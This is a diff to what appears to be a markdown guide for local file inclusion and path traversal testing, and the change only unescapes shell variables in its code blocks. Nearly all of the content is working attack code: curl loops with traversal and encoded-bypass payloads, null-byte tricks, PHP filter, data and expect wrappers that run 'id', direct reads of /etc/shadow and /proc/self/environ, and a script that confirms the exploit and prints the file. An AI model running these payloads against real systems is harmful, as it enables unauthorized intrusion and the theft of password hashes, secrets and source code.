@@ -34,11 +34,11 @@ Before testing, ensure you have a valid session:
 
 \`\`\`bash
 # Authenticate and save session
-curl -s -c cookies.txt -X POST "\$TARGET/login" \\
-  -d "username=\$USER&password=\$PASS"
+curl -s -c cookies.txt -X POST "$TARGET/login" \\
+  -d "username=$USER&password=$PASS"
 
 # Use session for subsequent requests
-AUTH_HEADER="Cookie: \$(cat cookies.txt | grep -v '^#' | awk '{print \$6\"=\"\$7}')"
+AUTH_HEADER="Cookie: $(cat cookies.txt | grep -v '^#' | awk '{print $6"="$7}')"
 \`\`\`
 
 ### Step 2: Identify Potential Vectors
@@ -62,9 +62,9 @@ payloads=(
   "../../../../../../etc/passwd"
 )
 for payload in "\${payloads[@]}"; do
-  response=\$(curl -s "\$TARGET?file=\$payload")
-  if echo "\$response" | grep -qE "root:x:|root:.*:0:0"; then
-    echo "[+] LFI confirmed with: \$payload"
+  response=$(curl -s "$TARGET?file=$payload")
+  if echo "$response" | grep -qE "root:x:|root:.*:0:0"; then
+    echo "[+] LFI confirmed with: $payload"
   fi
 done
 \`\`\`
@@ -79,9 +79,9 @@ encoded_payloads=(
   "..\\\\..\\\\..\\\\etc/passwd"           # Backslash (Windows style)
 )
 for payload in "\${encoded_payloads[@]}"; do
-  response=\$(curl -s "\$TARGET?file=\$payload")
-  if echo "\$response" | grep -qE "root:x:|root:.*:0:0"; then
-    echo "[+] LFI confirmed with encoded payload: \$payload"
+  response=$(curl -s "$TARGET?file=$payload")
+  if echo "$response" | grep -qE "root:x:|root:.*:0:0"; then
+    echo "[+] LFI confirmed with encoded payload: $payload"
   fi
 done
 \`\`\`
@@ -89,28 +89,28 @@ done
 #### Null Byte Injection (older PHP)
 \`\`\`bash
 # For systems appending extensions (e.g., .php)
-curl -s "\$TARGET?page=../../../etc/passwd%00"
-curl -s "\$TARGET?page=../../../etc/passwd%00.php"
+curl -s "$TARGET?page=../../../etc/passwd%00"
+curl -s "$TARGET?page=../../../etc/passwd%00.php"
 \`\`\`
 
 #### Wrapper/Filter Techniques (PHP)
 \`\`\`bash
 # PHP filter - read source code
-curl -s "\$TARGET?page=php://filter/convert.base64-encode/resource=index.php"
+curl -s "$TARGET?page=php://filter/convert.base64-encode/resource=index.php"
 
 # PHP data wrapper (if allow_url_include is on)
-curl -s "\$TARGET?page=data://text/plain,<?php system('id'); ?>"
+curl -s "$TARGET?page=data://text/plain,<?php system('id'); ?>"
 
 # Expect wrapper
-curl -s "\$TARGET?page=expect://id"
+curl -s "$TARGET?page=expect://id"
 \`\`\`
 
 #### Absolute Path Access
 \`\`\`bash
 # Try absolute paths directly
-curl -s "\$TARGET?file=/etc/passwd"
-curl -s "\$TARGET?file=/etc/shadow"
-curl -s "\$TARGET?file=/proc/self/environ"
+curl -s "$TARGET?file=/etc/passwd"
+curl -s "$TARGET?file=/etc/shadow"
+curl -s "$TARGET?file=/proc/self/environ"
 \`\`\`
 
 #### Windows-Specific Payloads
@@ -121,8 +121,8 @@ win_payloads=(
   "C:\\\\windows\\\\win.ini"
 )
 for payload in "\${win_payloads[@]}"; do
-  response=\$(curl -s "\$TARGET?file=\$payload")
-  if echo "\$response" | grep -qiE "\\[fonts\\]|\\[extensions\\]"; then
+  response=$(curl -s "$TARGET?file=$payload")
+  if echo "$response" | grep -qiE "\\[fonts\\]|\\[extensions\\]"; then
     echo "[+] Windows LFI confirmed"
   fi
 done
@@ -173,13 +173,13 @@ AUTH_HEADER="Cookie: \${SESSION}"
 # STEP 2: EXPLOITATION
 # The technique that worked:
 echo "[*] Exploiting LFI vulnerability..."
-response=\$(curl -s -H "\$AUTH_HEADER" \\
-  "\$TARGET?file=../../../etc/passwd")
+response=$(curl -s -H "$AUTH_HEADER" \\
+  "$TARGET?file=../../../etc/passwd")
 
 # STEP 3: VALIDATE SUCCESS
-if echo "\$response" | grep -qE "root:x:|root:.*:0:0"; then
+if echo "$response" | grep -qE "root:x:|root:.*:0:0"; then
   echo "[+] LFI CONFIRMED - Successfully read /etc/passwd"
-  echo "\$response"
+  echo "$response"
   exit 0
 else
   echo "[-] LFI exploitation failed"
@@ -194,7 +194,7 @@ fi
 | Target File | What to Validate |
 |-------------|------------------|
 | /etc/passwd | Contains "root:x:0:0" or similar user entries |
-| /etc/shadow | Contains hashed passwords (root:\$6\$...) |
+| /etc/shadow | Contains hashed passwords (root:$6$...) |
 | win.ini | Contains [fonts] or [extensions] sections |
 | .env files | Contains KEY=VALUE configuration pairs |
 | Source code | Contains actual PHP/Python/etc. code |
@@ -230,10 +230,10 @@ Look for these signs that indicate a filter is present:
 
 \`\`\`bash
 # Step 1: Establish baseline - confirm parameter affects file loading
-curl -s "\$TARGET?file=valid_file" # Should return content
+curl -s "$TARGET?file=valid_file" # Should return content
 
 # Step 2: Test basic traversal
-curl -s "\$TARGET?file=../valid_file" # If blocked, filter exists
+curl -s "$TARGET?file=../valid_file" # If blocked, filter exists
 
 # Step 3: If filtered, systematically test bypass categories:
 # - URL encoded variants
